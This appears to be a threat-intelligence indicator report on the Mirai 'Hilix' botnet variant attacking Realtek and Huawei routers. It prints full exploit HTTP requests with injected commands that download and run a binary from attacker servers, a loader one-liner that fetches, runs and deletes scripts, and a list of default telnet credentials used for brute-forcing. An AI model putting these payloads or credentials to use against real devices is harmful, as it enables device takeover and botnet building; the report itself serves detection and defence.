snapshot_2025-08-20/filtered_md/train/5ebd9f11-4628-4dc2-abaf-4d54950d210f.md

# Threat Report: 2020-05-14: Linux/Mirai-Hilix (w/New TABLE encoder) aims Realtek & Huawei routers


## Key Intelligence
* Date: 2020-05-14
* Threat Level: 3 (Low)
* Tags: tlp:white, circl:incident-classification="malware", malware_classification:malware-category="Botnet", Mirai

---

## Indicators of Compromise (IOCs)
### Internal reference
* link: https://www.virustotal.com/gui/file/a7f3670b9720fd2092d0cd0f52b46fecd431d442a9bff6ec8839e854147b7c53/community — Technical announcement and analysis report
* link: https://old.reddit.com/r/LinuxMalware/comments/gj1x02/linuxmirai_hilix/ — Technical announcement and analysis report
* link: https://imgur.com/a/lWbs6T1 — Technical announcement and analysis report
* link: https://twitter.com/malwaremustd1e/status/1260582039503417344 — Technical announcement and analysis report

### Network activity
* comment: attack_method_greip
attack_method_greeth
attack_method_std
attack_method_tcpsyn
attack_method_tcpack
attack_method_tcpstomp
attack_method_tcpxmas
attack_method_udpgeneric
attack_method_udpvse
attack_method_udpdns
attack_method_udpplain — Linux/Mirai Hilix DDoS attack methods

### Payload delivery
* filename: Hilix.sh — Linux/Mirai Hilix loader script filename
* filename: Hilix1.sh — Linux/Mirai Hilix loader script filename
* filename: Hilix2.sh — Linux/Mirai Hilix loader script filename
* filename: Hilix3.sh — Linux/Mirai Hilix loader script filename
* filename: Hilix4.sh — Linux/Mirai Hilix loader script filename
* ip-src: 142.93.217.221 — Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.
* ip-src: 159.203.44.33 — Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.
* ip-src: 194.180.224.124 — Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.
* ip-src: 194.180.224.150 — Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.
* comment: POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */ï¼Š\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 159.203.44.33 -l /tmp/binary -r /bins/Hilix.mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n

POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://159.203.44.33/bins/Hilix.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n


POST /wanipcn.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://159.203.44.33/bins/Hilix.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n — Linux/Mirai Hilix loader's infection script injection (Realtek, Huawei routers vulnerabilities)

### Payload installation
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* md5: <md5> — Linux/Mirai Hilix new encoder hashes
* comment: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.124/Hilix.sh; curl -O http://194.180.224.124/Hilix.sh; chmod 777 Hilix.sh; sh Hilix.sh; tftp 194.180.224.124 -c get Hilix3.sh; chmod 777 Hilix3.sh; sh Hilix3.sh; tftp -r Hilix2.sh -g 194.180.224.124; chmod 777 Hilix2.sh; sh Hilix2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.180.224.124 Hilix1.sh Hilix1.sh; sh Hilix1.sh; rm -rf Hilix.sh Hilix3.sh Hilix2.sh Hilix1.sh; rm -rf *; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.124/bins/Hilix.x86 -O /tmp/Hilix; chmod +x /tmp/Hilix; /tmp/Hilix sbot.x86 — Linux/Mirai Hilix loader script injection (bruteforce default password)

### Targeting data
* comment: "root","xc3511"
"root","xc3518"
"root","xc3515"
"vstarcam2015","20150602"
"admin","admin"
"root","zte9x15"
"root","vizxv"
"root","admin"
"root","vertex25ektks123"
"admin","vertex25ektks123"
"root","Zte521"
"default"
"default","OxhlwSG8"
"default","S2fGqNFs"
"default","lJwpbo6"
"default","antslq"
"guest","xc3511"
"admin","aquario"
"support","support"
"admin","password"
"user","user"
"admin","admin1234"
"admin","1111"
"guest","guest"
"guest","12345"
"admin","1234"
"admin","ipcam_rt5350"
"root","ipcam_rt5350"
"admin","ho4uku6at"
"admin","kont2004"
"admin","Win1doW$ "
"root","hunt5759"
"admin","COadmin123"
"admin","ZmqVfoSIP"
"root","3ep5w2u" — Linux/Mirai Hilix targeted products (telnet default password)
